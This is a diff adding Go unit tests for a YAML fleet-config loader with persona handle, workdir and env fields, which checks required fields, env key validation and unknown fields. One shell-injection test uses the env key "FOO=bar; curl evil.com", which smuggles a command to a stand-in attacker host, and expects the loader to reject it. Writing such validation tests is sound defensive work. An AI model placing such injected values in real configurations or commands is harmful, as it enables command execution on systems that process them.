@@ -98,6 +98,84 @@ personas:
 	}
 }
 
+func TestLoadFleetConfig_MissingHandle(t *testing.T) {
+	// handle が空 → エラー
+	yaml := `
+personas:
+  - workdir: /tmp/reviewer
+`
+	path := writeTempFleet(t, yaml)
+	_, err := LoadFleetConfig(path)
+	if err == nil {
+		t.Fatal("expected error for missing handle, got nil")
+	}
+}
+
+func TestLoadFleetConfig_MissingWorkdir(t *testing.T) {
+	// workdir が空 → エラー
+	yaml := `
+personas:
+  - handle: reviewer
+`
+	path := writeTempFleet(t, yaml)
+	_, err := LoadFleetConfig(path)
+	if err == nil {
+		t.Fatal("expected error for missing workdir, got nil")
+	}
+}
+
+func TestLoadFleetConfig_InvalidEnvKey(t *testing.T) {
+	// env キー名が不正 (シェルインジェクション防止 Critical #1)
+	yaml := `
+personas:
+  - handle: reviewer
+    workdir: /tmp/reviewer
+    env:
+      "FOO=bar; curl evil.com": injected
+`
+	path := writeTempFleet(t, yaml)
+	_, err := LoadFleetConfig(path)
+	if err == nil {
+		t.Fatal("expected error for invalid env key, got nil")
+	}
+}
+
+func TestLoadFleetConfig_ValidEnvKey(t *testing.T) {
+	// 有効な env キー名は通る
+	yaml := `
+personas:
+  - handle: reviewer
+    workdir: /tmp/reviewer
+    env:
+      MY_VAR: hello
+      _UNDERSCORE: ok
+      VAR123: fine
+`
+	path := writeTempFleet(t, yaml)
+	cfg, err := LoadFleetConfig(path)
+	if err != nil {
+		t.Fatalf("LoadFleetConfig: %v", err)
+	}
+	if cfg.Personas[0].Env["MY_VAR"] != "hello" {
+		t.Errorf("Env[MY_VAR] = %q, want hello", cfg.Personas[0].Env["MY_VAR"])
+	}
+}
+
+func TestLoadFleetConfig_UnknownField(t *testing.T) {
+	// unknown フィールドは KnownFields(true) によりエラー
+	yaml := `
+personas:
+  - handle: reviewer
+    workdir: /tmp/reviewer
+    unknown_field: oops
+`
+	path := writeTempFleet(t, yaml)
+	_, err := LoadFleetConfig(path)
+	if err == nil {
+		t.Fatal("expected error for unknown field, got nil")
+	}
+}
+
 func TestLoadFleetConfig_DefaultValues(t *testing.T) {
 	// bypass_permissions 未指定 → false (default)、idle_timeout 未指定 → 0
 	yaml := `
